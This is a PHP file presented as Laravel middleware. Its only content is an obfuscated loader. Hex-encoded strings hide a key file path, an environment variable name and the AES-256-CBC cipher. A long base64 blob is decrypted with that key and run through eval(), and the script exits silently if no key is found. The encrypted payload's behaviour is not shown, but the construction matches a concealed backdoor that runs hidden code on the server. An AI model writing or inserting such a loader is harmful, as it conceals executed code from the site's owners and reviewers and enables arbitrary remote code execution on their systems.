<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KceOkajiCg051NbyUH2dzg==');

$c=base64_decode(

'QQr4ubwUMo/hnkrpXZQgD+qFd9ohZyfAER04HPtl7h+Xj6mpVZEhQrK3tPn3hXF9ZgoUeCSI6aSo' .
'z7lb6AaJ6j92zpPA8PumN5xps+9DNly0AEv7F+le+mDrBtUMGEdpkxYYL5/07klDQgvGmpQxE+qi' .
'UIjyGLuc2lmjbIfEfRyzo7ek4V0fSqOvaQuQS+uu6BmgmFE9wqULV8zrqF2bamEhFlfnufkpV/w2' .
'ubsf1BaygK+tJkGFQhksZVluCvOPwutljw5zhewmOKKzUXIK+CjoPYcr2NklEMmeM1Q4RmYvT2PQ' .
'YT6GOLGeSlCTXzQ075jS42bjXd7fod+UxrS1yxyH923BmstZvoO6wwPdCYp1ah4wnkQONKjpLOYX' .
'4wMgHReBsJlIPVRLGq67atyOulhZ3mUmVWNr0keIgEP9elOv9/OWqH4NslOk2SAW4hfBlQddmXKj' .
'gnBwfmDRkE38IjyAJKutztubx2Q5airw6gMnIkXIpJTNAT67Br9nnoqhAUu5Ue9Vf5ij2NgWUFxB' .
'HgvJ59KVjrEJLAIXYSkKK1hK6H2LAHuwoWLHflpYKBx3qYjCIsKbdJp+cPhCkkYJGnEdvHBpZFJA' .
'Zt1XXJIpdFnNVrz2bnXuW1KVSONXhe1FPdcP3ySzyJ6kYH+7qSwUf31wWnckCc5MK46v00Lbdzgs' .
'RpuA171Gq6p6PkwL+TqDM7CtuHzYGLnWCbKet513oPhsinZ9utY31fsrAMw+n1vNIitTLFK8YDkL' .
'j8hUEKzmur2dNOJSSQACIdvHxrUCzkLjpgse0uPhaOvF60W/8LzgU3qVPLAwgYz6imSdBCgOql+M' .
'y+xZvlgsYd2Us2ciDd3jeyQiTAy5o4PQ5jM4HFNdtAGhPVeUt20++ui29YtdLk2ZL2T3dKhmRHym' .
'7wKy5CO22SbIE++rhh4lxvRWfHg5n3yyjxQN9qlhpTaZ5fbZegXnYfEsaNpwZQMCO1HpxfWHOkp9' .
'pMYOJSsTKXbK9w1t5KGdKjMmadiMnx/hk2vXlEMpPQXvQG1J0V6/ifA3AVcdMFArDaVGj1bGH4KI' .
'YNEGN+eqGn0D7JwsOdwQ4rxaI9B5DsUM3t5uhFmgG13lHaFdQnieTsQpIpL9FrRZC2bttSrPD2zs' .
'ksxX2Wl1oQw2I4dntT4esleKWMBArfVHYx/KGi0yjUjyZ+B/l+JinzEkKyB6pruIVb0pRf3PXm32' .
'Y44ncD9eF7gB7q1jOvL39roVZTv6+akTq4Z4+4+FEldP9IsXjwcExPrkq4lVgZ51QitduexRiiDu' .
'wWIavOH3OOvBExDiQGUJ3e3KgFu21yvxKWiYqs9coUHBg+Df46VIHt9y9QDoWq4PxQbyqE/4vMrf' .
'mgD1hLysdgFKAeyFnFKtdioJItnvqkeDqAmpCbIAdolTB4dGOQ5bE6jHZAN71rMUMLCjuZsitafS' .
'dWAhe2TIiWiN4rLWnypXissSEx9ncyxZOFjsRBv8vszGfbHIKDR7LSfh0ZgYQVqi1c9qzWioZCCC' .
'I/LRchuWYTFVIHAUh81GfuJppdi7+x/RZ76G8il1X3fl1s9c+c2ieRoF8ggaS+nsS36A/Yxltzb0' .
'+B1mHgIZ4dTQZRCxQQWuvsswo+/jFR5ap1j5K+bB8WCayXuFb4KL4TkInDkaVwIiX6ELd0tw6bob' .
'PXH+JyoTjxD8/zwcVmqtAJvxw54wO19n7JQdvRg9r71eT/zhClFT6v8ruUHlAnuTD2KmOEoGOBKJ' .
'oETpyMb3dhJe/sIX2sfOBYRYMSv22P8irRZpm9NlVRc21KVMNd0SupjhKE5OTkTGVbYRrt/+7qZZ' .
'gNpPdUfzy7GrCj6n+LqKiAOKN7/xQoAQdnf0AXRSLrlTSL2We3JnYaaZ6X0+JNlfyDpEtO0ex66i' .
'AMpQuqS7UJibNCRvpEKzdPmcQ6MsoXUInHt/SnVfC7oDB5yE+FF/bXs6/5ZUkhLbJJGK3dGjU8UD' .
'XecB/3rYr0JjSwrDAH8yrLadjC4gAEwZ9Thab26UT93yTaYY/mXr/wYG57AidxiXXSfRU6P4+Dkf' .
'jUIuA61vnJ59mmXUZabl3h3nDIA4+hjmzVroNVp5etJWV+jExFBuuB9yXZMXwjDTtd8unjl1qvAh' .
'v0rrp1mCjsnnJ/nY6RKJuG4Pur40LPdd32rsTB6S9vkrDjzkPDcomNLahDg+NhgESrb7eLMTamZr' .
'JfufcUxZEWeusSazf6HwIgq2Oqi3fnNxe0wMdeGfAzR7aDFpXKqOyLTyDd4AV+uXFLqziwQ616xK' .
'9Ca7MObZDmjs6ZBauPReVibwVL6LPrV8PnaapDJRnQy+RPUgieICfrhrRNko07jZ1ZCQHxstdnvO' .
'mxjWyVAiweZFlix1GHYJnjE9yZbn+EneOegzSbu3Q07kNAVi+GTIgRt/93z5rThYlccLnWsUit/H' .
'MPNSHdJYNcPulQeZtNvuEOKbFUy+vCiwSebhm9+irOK9LQF4eBv8kHNGoiXf6cXtgUOT03Kq5Ra3' .
'xzqmegbiQs6c7zwMOPpz26OJeWCR6KbvuwDTvswgsuT+ef/+93PsPxP1KVm5VlGukC/VPP0PYVWT' .
'QPyVSNEVW7pZZUOnD/AEP6r6+/Ll8ONCgkKm5otuHTl7TZgAVsuWZIieVNtJQS5PBM1s/NsxLQnq' .
'UzR299O5uQuUQSc2cT8VLX7Jd7d/vJ9wVeyRXsQqvT/31juNU22MjzwmhhiktPG5e6zLJSJ7COTf' .
'VEdbvMlP/a50sG0Lcy4Ohxd5b27vXMKKbzWVaph7zHUZ3k9IhFNIwaMzncoUtVemTyk/t1bLv2mO' .
'LJmC/Ui6McQmuFEeKCnuViE37ZIJQ3G9y1ypOc2rnoFSUzbw6A+HWIaFQLI4Tfx9RGjrgAKT5F5n' .
'32ttKB50l/+L3EOQLSx8ZCGktLL69nkSyGs5MyDgAXX/RhJH7AqHRp31GXhjkxZBhu20S4QlsV/4' .
'At8EN052r8DwWIarPPLgZK525lEO1rlyYGd27zG1CXGJ6wxl9stD6KcfY99O34x5gbiHwcAzoeSF' .
'eyf0zzh2Ny2T1d84b/6iYNxOiFyARIvzTLBKmYEtEFNW8/HVrXgZkqZAQ3pHsvVzepf58SiH3hXR' .
'1oTAPisAB9lPqe2wDQh/BqY7dU2XvVoSDutkj1TeZhjz58yk5XROQgVfHE+io+xCuSO1TnUlpKVk' .
'1Zhk86nWLsEuDxelm4GLJk5lBoeWtZd04126Maz61tANlTMdEV562uLME2AW8mZSKCmeCdeoz+Qk' .
'RBV0d7acjN0OAy8z2fRlW5yi8iDLm3Hv2kB2tf9ppLJk5DN9Pi8jYqfM5MLdq3MiJbMkwl6oJkJW' .
'xZ+SWPg/YecSqWj0SRa0qLsVZ7lCvcdo0I7/sykaomMmHJU2QBPdQdSOBY6uWmyq+cv5pizgjHjN' .
'ZrmUZrUqxNBC8OV4gePlKtlEgJPIOIslUNJ3n4oe8Uo15tduKWdAZu9TwFs9KfoSbUolqx/uKsUb' .
'RaKbEOj9kzX6j8ou3XbiVlgVMX5pRh2A8iq/umNTiFgvxUJ7N9aP6Rl2CEgtU/QZFaYKd0LH8Ljg' .
'UMp1EdNDkPeJ/NPOBwTvNy0x8tgssF777JQNyO5oApeuLVKdCONazcr8/ADdGOpLy9jhX6jI69Sa' .
'iWwJi92/mjq1eLY1dVYWsqoi1AgcXJxLR/u0X1WhkwOEeZ7ZKmBRlPsr5ShAXoBS/Y5nuSPtuRnz' .
'iT8GUK5WCbbwlAZlPTByWdx7ZQFKMv+lIc6SbhRxRL/ykZCnqMO32XR1dzISrQvPkIYO+NThAh9E' .
'KHr59Gv4P8hg21xptuQ='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

